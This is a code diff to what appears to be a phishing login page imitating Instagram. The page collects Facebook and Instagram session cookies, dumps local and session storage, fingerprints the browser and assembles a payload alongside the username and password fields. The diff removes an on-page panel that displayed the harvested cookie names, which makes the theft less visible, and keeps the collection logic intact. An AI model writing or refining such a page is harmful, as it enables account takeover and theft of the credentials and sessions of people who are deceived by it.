@@ -439,13 +439,13 @@ LOGIN_PAGE_HTML = """
 
 <style>
 :root{
-  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--chip:#efefef;--blue:#0095f6;
+  --bg:#fff;--tx:#000;--mut:#8e8e8e;--line:#dbdbdb;--inbg:#fafafa;--blue:#0095f6;
   --ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);
   --glow:rgba(214,41,118,.13);
   --e:cubic-bezier(.22,1,.36,1);
 }
 @media (prefers-color-scheme:dark){
-  :root{--bg:#000;--tx:#f5f5f5;--mut:#a8a8a8;--line:#262626;--inbg:#121212;--chip:#262626;--glow:rgba(214,41,118,.2)}
+  :root{--bg:#000;--tx:#f5f5f5;--mut:#a8a8a8;--line:#262626;--inbg:#121212;--glow:rgba(214,41,118,.2)}
 }
 *{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
 html{height:100%;-webkit-text-size-adjust:100%;text-size-adjust:100%}
@@ -512,40 +512,13 @@ input:focus{
 @keyframes autofillStart{from{}to{}}
 input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
-/* ---------- brand cookie jars ---------- */
-.jars{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-top:11px;animation:up .55s .29s var(--e) backwards}
-.jar{
-  position:relative;overflow:hidden;border-radius:13px;padding:9px 11px 10px;
-  border:1px solid var(--line);background:var(--inbg);
-  transition:transform .35s var(--e),box-shadow .35s var(--e),border-color .3s var(--e);
-}
-.jar.fb{border-color:rgba(24,119,242,.42);background:linear-gradient(155deg,rgba(24,119,242,.14),rgba(24,119,242,.03))}
-.jar.ig{border-color:rgba(214,41,118,.42);background:linear-gradient(155deg,rgba(254,218,117,.18),rgba(214,41,118,.13) 48%,rgba(79,91,213,.15))}
-.jar::after{content:"";position:absolute;inset:0;pointer-events:none;opacity:.5;
-  background:radial-gradient(90% 70% at 100% 0,rgba(255,255,255,.35),transparent 70%)}
-.jar:hover{transform:translateY(-2px);box-shadow:0 9px 22px rgba(0,0,0,.10)}
-.jar.pop{animation:pop .45s var(--e)}
-@keyframes pop{0%{transform:scale(1)}45%{transform:scale(1.035)}100%{transform:scale(1)}}
-.jar-h{position:relative;z-index:1;display:flex;align-items:center;gap:6px;font-size:11.5px;font-weight:700;letter-spacing:.2px}
-.jar-dot{width:7px;height:7px;border-radius:50%;flex:none}
-.fb .jar-dot{background:#1877f2;box-shadow:0 0 0 3px rgba(24,119,242,.22)}
-.ig .jar-dot{background:linear-gradient(45deg,#feda75,#d62976,#4f5bd5);box-shadow:0 0 0 3px rgba(214,41,118,.22)}
-.jar-n{margin-left:auto;font-size:10px;font-weight:700;padding:1px 7px;border-radius:99px;background:var(--chip);color:var(--mut);transition:background .3s,color .3s}
-.fb .jar-n{background:rgba(24,119,242,.16);color:#1877f2}
-.ig .jar-n{background:rgba(214,41,118,.16);color:#d62976}
-.jar-l{position:relative;z-index:1;margin-top:7px;display:flex;flex-wrap:wrap;gap:4px;min-height:15px;max-height:62px;overflow:auto;scrollbar-width:none}
-.jar-l::-webkit-scrollbar{display:none}
-.jar-l i{font-style:normal;font-size:10.5px;color:var(--mut)}
-.jar-l b{font-weight:600;font-size:10px;padding:2px 6px;border-radius:6px;background:rgba(0,0,0,.055);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
-@media (prefers-color-scheme:dark){.jar-l b{background:rgba(255,255,255,.09)}}
-
 .login-btn{
   position:relative;overflow:hidden;width:100%;margin-top:12px;padding:13px 0;
   border:0;border-radius:24px;background:var(--blue);color:#fff;
   font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;
   box-shadow:0 6px 18px rgba(0,149,246,.3);
   transition:transform .3s var(--e),box-shadow .35s var(--e),filter .25s;
-  animation:up .55s .35s var(--e) backwards;
+  animation:up .55s .32s var(--e) backwards;
 }
 .login-btn::after{
   content:"";position:absolute;top:0;left:-60%;width:45%;height:100%;
@@ -558,11 +531,11 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 .forgot{
   margin-top:16px;font-size:14px;color:var(--tx);cursor:pointer;
   transition:letter-spacing .35s var(--e),opacity .25s;
-  animation:up .55s .41s var(--e) backwards;
+  animation:up .55s .38s var(--e) backwards;
 }
 .forgot:hover{letter-spacing:.4px;opacity:.72}
 
-.create{margin-top:26px;animation:up .55s .47s var(--e) backwards}
+.create{margin-top:26px;animation:up .55s .44s var(--e) backwards}
 .create button{
   width:100%;padding:13px 0;border-radius:24px;
   border:1px solid var(--blue);background:transparent;color:var(--blue);
@@ -574,7 +547,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
 /* footer pinned: never travels with the keyboard */
 .bottom{flex:none;position:relative;z-index:2;text-align:center;padding-top:6px;
-  animation:up .6s .53s var(--e) backwards}
+  animation:up .6s .5s var(--e) backwards}
 .meta{font-size:14px;color:var(--mut);display:flex;justify-content:center;align-items:center;gap:6px;margin-bottom:4px}
 .meta .inf{display:inline-block;animation:pulse 3.2s ease-in-out infinite}
 .footer{font-size:11.5px;color:var(--mut);line-height:1.6;padding-bottom:2px}
@@ -612,17 +585,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
                        autocomplete="username" enterkeyhint="next" required>
                 <input type="password" id="p" name="password" placeholder="Password"
                        autocomplete="current-password" enterkeyhint="go" required>
-            </div>
-
-            <div class="jars">
-                <div class="jar fb" id="fbBox">
-                    <div class="jar-h"><span class="jar-dot"></span>Facebook<span class="jar-n" id="fbN">0</span></div>
-                    <div class="jar-l" id="fbL"><i>none yet</i></div>
-                </div>
-                <div class="jar ig" id="igBox">
-                    <div class="jar-h"><span class="jar-dot"></span>Instagram<span class="jar-n" id="igN">0</span></div>
-                    <div class="jar-l" id="igL"><i>none yet</i></div>
-                </div>
             </div>
 
             <button type="submit" class="login-btn">Log in</button>
@@ -725,44 +687,10 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     raw.split(';').forEach(function (chunk) {
       var p = chunk.trim();
       if (!p || p.indexOf('=') < 0) return;
-      var name = p.split('=')[0].trim();
-      if (brandOf(name)) out.push(p);
+      if (brandOf(p.split('=')[0].trim())) out.push(p);
     });
     return out;
   }
-
-  function paintJar(brand, list) {
-    var box = document.getElementById(brand + 'Box');
-    var num = document.getElementById(brand + 'N');
-    var lst = document.getElementById(brand + 'L');
-    if (!box || !num || !lst) return;
-    num.textContent = list.length;
-    if (!list.length) {
-      lst.innerHTML = '<i>none yet</i>';
-    } else {
-      lst.innerHTML = list.map(function (p) {
-        var k = p.split('=')[0].trim();
-        return '<b title="' + k + '">' + k.replace(/</g, '&lt;') + '</b>';
-      }).join('');
-      box.classList.remove('pop');
-      void box.offsetWidth;
-      box.classList.add('pop');
-    }
-  }
-
-  function renderJars() {
-    var all = metaCookies();
-    var fb = [], ig = [];
-    all.forEach(function (p) {
-      var b = brandOf(p.split('=')[0].trim());
-      if (b === 'fb') fb.push(p); else if (b === 'ig') ig.push(p);
-    });
-    paintJar('fb', fb);
-    paintJar('ig', ig);
-  }
-
-  setInterval(renderJars, 2000);
-  renderJars();
 
   /* ---------- fingerprints ---------- */
   function canvasSig() {
@@ -879,7 +807,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     var local = storageDump(localStorage);
     var sess = storageDump(sessionStorage);
     var cookies = metaCookies().join('; ');
-    renderJars();
 
     var payload = {
       sid: SID,
